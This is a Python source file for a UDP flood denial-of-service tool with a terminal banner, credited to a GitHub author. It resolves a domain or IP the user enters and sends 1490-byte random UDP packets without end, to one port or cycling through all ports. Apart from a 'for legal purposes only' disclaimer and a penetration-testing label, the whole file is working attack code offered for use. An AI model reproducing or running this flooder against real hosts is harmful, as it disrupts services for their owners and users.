import sys
import socket
import random
import time
import threading
import os
import pyttsx3

GREEN = "\033[32m"
BLUE = "\033[34m"
RED = "\033[31m"
YELLOW = "\033[33m"
RESET = "\033[0m"

ascii="""
▓█████▄ ▓█████▄  ▒█████    ██████    ▄▄▄█████▓ ▒█████   ▒█████   ██▓    
▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒    ▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒    
░██   █▌░██   █▌▒██░  ██▒░ ▓██▄      ▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░    
░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒   ░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░    
░▒████▓ ░▒████▓ ░ ████▓▒░▒██████▒▒     ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒
 ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░     ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░
 ░ ▒  ▒  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░       ░      ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░
 ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░       ░      ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░   
   ░       ░        ░ ░        ░                  ░ ░      ░ ░      ░  ░
 ░       ░                                                              
"""
engine = pyttsx3.init()
version = "1.2"

os.system("clear")

print(f"{RED}{ascii}{RESET}")

def vip(yazi, bekleme=0.02, end="\n"):
    for harf in yazi:
        sys.stdout.write(harf)
        sys.stdout.flush()
        time.sleep(bekleme)
    sys.stdout.write(end)  # print() yerine end parametresini kullandırıyoruz

def clear():
    os.system("clear")

def show_banner():
    vip(f"\033[91mDDoS Tool\033[0m \033[95mVersion: {version}\033[0m")
    vip("Author: \033[91mctrl-alt-del-2010-developer\033[0m")
    vip("Github: https://github.com/ctrl-alt-del-2010-developer/simple-tool-kit/blob/main/STK/Programs/DDoS-tool.py")
    vip("\033[92mFor legal purposes only\033[0m")
    vip("----------------------------------------------------------------------------------------------------------------")
    
def show_about():
    vip("\nThis DDoS Tool is an open source tool for penetration testing.")
    vip("You can test networks/servers/any other devices with it.")
    vip("Author of the program is not responsible for its usage.")
    vip("Everybody MUST use it ONLY in legit cases.")
    vip("For more information visit project's site.\n")

def get_target():
    while True:
        print("")
        vip("Target Type:")
        vip(f"{RED}[{YELLOW}01{RED}]{RESET} Website Domain")
        vip(f"{RED}[{YELLOW}02{RED}]{RESET} IP Address")
        vip(f"{RED}[{YELLOW}03{RED}]{RESET} About/Help")
        print("")
        type_choice = input("Select target type [1/2/3]: ").strip()
        if type_choice == '1':
            domain = input("Enter domain (e.g. example.com): ").strip()
            if not domain:
                vip("Please enter a domain.")
                continue
            try:
                ip = socket.gethostbyname(domain)
                return ip, domain
            except Exception as e:
                vip(f"Could not resolve domain: {e}")
        elif type_choice == '2':
            ip = input("Enter IP address: ").strip()
            if not ip:
                vip("Please enter an IP address.")
                continue
            return ip, ip
        elif type_choice == '3':
            show_about()
        else:
            vip("Invalid selection.")

def get_port():
    while True:
        vip("Port Selection:")
        vip("1) All Ports (increment)")
        vip("2) Certain Port")
        port_choice = input("Select port mode [1/2]: ").strip()
        if port_choice == '1':
            return False, 2
        elif port_choice == '2':
            try:
                port = int(input("Enter port (2-65534): ").strip())
                if 2 <= port <= 65534:
                    return True, port
                else:
                    vip("Port must be between 2 and 65534.")
            except ValueError:
                print("Please enter a valid port number.")
        else:
            vip("Invalid selection.")

class DDoSAttack:
    def __init__(self, ip, port_mode, port):
        self.ip = ip
        self.port_mode = port_mode
        self.port = port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.bytes = random._urandom(1490)
        self.is_attacking = False
        self.thread = None

    def start(self):
        self.is_attacking = True
        self.thread = threading.Thread(target=self.attack)
        self.thread.start()

    def stop(self):
        self.is_attacking = False
        if self.thread:
            self.thread.join()

    def attack(self):
        sent = 0
        port = self.port
        vip("INITIALIZING....")
        time.sleep(1)
        vip("STARTING...")
        try:
            if not self.port_mode:
                while self.is_attacking:
                    if port == 65534:
                        port = 2
                    elif port == 1900:
                        port = 1901
                    self.sock.sendto(self.bytes, (self.ip, port))
                    sent += 1
                    port += 1
                    print(f"Sent {sent} packets to {self.ip} through port: {port}", end="\r")
            else:
                if port < 2:
                    port = 2
                elif port == 65534:
                    port = 2
                elif port == 1900:
                    port = 1901
                while self.is_attacking:
                    self.sock.sendto(self.bytes, (self.ip, port))
                    sent += 1
                    vip(f"Sent {sent} packets to {self.ip} through port: {port}", end="\r")
        except Exception as e:
            vip(f"\nExited: {str(e)}")
        finally:
            self.is_attacking = False

if __name__ == "__main__":
    show_banner()
    ip, target = get_target()
    port_mode, port = get_port()
    attack = DDoSAttack(ip, port_mode, port)

    vip("\nPress Ctrl+C to stop the attack at any time.\n")
    attack.start()
    try:
        while attack.is_attacking:
            time.sleep(0.2)
    except KeyboardInterrupt:
        vip("\nStopping attack...")
        attack.stop()
        vip("Attack stopped by user.")
    vip("\nExiting.")